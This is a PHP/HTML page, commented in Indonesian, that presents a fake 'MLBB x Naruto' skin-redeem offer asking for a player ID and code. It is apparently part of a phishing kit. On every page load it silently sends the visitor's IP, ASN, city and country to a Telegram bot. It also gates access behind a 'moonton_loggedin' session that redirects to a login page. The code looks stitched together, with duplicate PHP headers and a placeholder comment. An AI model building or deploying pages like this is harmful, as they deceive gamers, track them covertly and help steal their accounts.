
<?php
include 'includes/config.php';
include 'includes/functions.php';

// Ambil data IP dan lokasi
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);

// Kirim data ke Telegram
sendToTelegram("User accessed page - IP: $ip | ASN: $asn | City: $city | Country: $country");

?>
<?php
session_start();
include 'includes/config.php';
include 'includes/functions.php';

// Jika belum login, redirect ke login
if (!isset($_SESSION['moonton_loggedin'])) {
    header("Location: login.php?redirect=index.php");
    exit;
}

// ... kode yang sudah ada sebelumnya ...
?>
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Skin MLBB x Naruto</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="assets/images/logo.png" alt="MLBB x Naruto" class="logo">
            <h1>Redeem Skin MLBB x Naruto</h1>
        </header>
        
        <main>
            <div class="banner">
                <img src="assets/images/naruto-mlbb-collab.jpg" alt="Kolaborasi MLBB dan Naruto">
            </div>
            
            <form action="redeem.php" method="POST" class="redeem-form">
                <div class="form-group">
                    <label for="player_id">Player ID MLBB:</label>
                    <input type="text" id="player_id" name="player_id" required>
                </div>
                
                <div class="form-group">
                    <label for="code">Kode Redeem:</label>
                    <input type="text" id="code" name="code" required>
                </div>
                
                <button type="submit" class="redeem-btn">Redeem Sekarang</button>
            </form>
            
            <div class="terms">
                <p>Dengan menekan tombol redeem, Anda menyetujui <a href="terms.php">Syarat dan Ketentuan</a> kami.</p>
            </div>
        </main>
        
        <footer>
            <p>© 2023 MLBB x Naruto Collaboration. Tidak berafiliasi dengan Moonton atau Shueisha.</p>
        </footer>
    </div>
    
    <script src="assets/js/script.js"></script>
</body>
              </html>
